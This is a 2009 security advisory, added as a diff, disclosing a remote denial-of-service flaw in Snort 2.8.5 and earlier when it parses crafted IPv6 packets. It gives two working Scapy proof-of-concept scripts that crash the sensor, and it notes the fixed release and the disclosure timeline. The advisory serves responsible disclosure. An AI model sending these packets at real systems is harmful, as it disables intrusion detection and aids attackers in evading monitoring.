@@ -1,0 +1,76 @@
+=============================================
+- Date: October 22th, 2009
+- Discovered by: Laurent Gaffi&#65533;
+- Severity: Low
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Snort <= 2.8.5 IPV6 Remote DoS
+
+
+II. DESCRIPTION
+-------------------------
+A remote DoS was present in Snort 2.8.5 when parsing some specialy IPv6
+crafted packet
+To trigger theses bugs you need to have compiled snort with the
+--enable-ipv6 option, and run it in verbose mode (-v)
+
+III. PROOF OF CONCEPT
+-------------------------
+You can reproduce theses two differents bugs easily by using the Python
+low-level networking lib Scapy
+(http://www.secdev.org/projects/scapy/files/scapy-latest.zip)
+
+1) #only works on x86
+
+#/usr/bin/env python
+from scapy.all import *
+u = "\x92"+"\x02" * 6
+send(IPv6(dst="IPv6_addr_here", nh=6)/u) #nh6 -> TCP
+
+2) # works x86,x64
+
+#/usr/bin/env python
+from scapy.all import *
+
+z = "Q" * 30
+send(IPv6(dst="IPv6_ADDR_HERE",nh=1)/ICMPv6NIQueryNOOP(type=4)/z) #nh1 ->
+icmp (not v6)
+
+
+IV. SYSTEMS AFFECTED
+-------------------------
+Theses proof of concept as been tested on snort:
+- 2.8.5
+
+V. NOT AFFECTED
+-------------------------
+Sourcefire 3D Sensor
+
+
+VI. SOLUTION
+-------------------------
+A new version correcting theses issues as been released (2.8.5.1) :
+
+http://www.snort.org/downloads
+
+
+VII. REFERENCES
+-------------------------
+http://www.snort.org/
+http://vrt-sourcefire.blogspot.com/
+
+VIII. REVISION HISTORY
+-------------------------
+October 14th, 2009: First issue discovered, advisory send to snort team.
+October 14th, 2009: Snort security team confirm the bug.
+October 16th, 2009: Second issue discovered, advisory send to snort team.
+October 20th, 2009: Snort security team confirm the bug.
+October 22th, 2009: Snort team released a new version.
+
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Laurent Gaffi&#65533;
+Laurent.gaffie{remove-this}(at)gmail.com
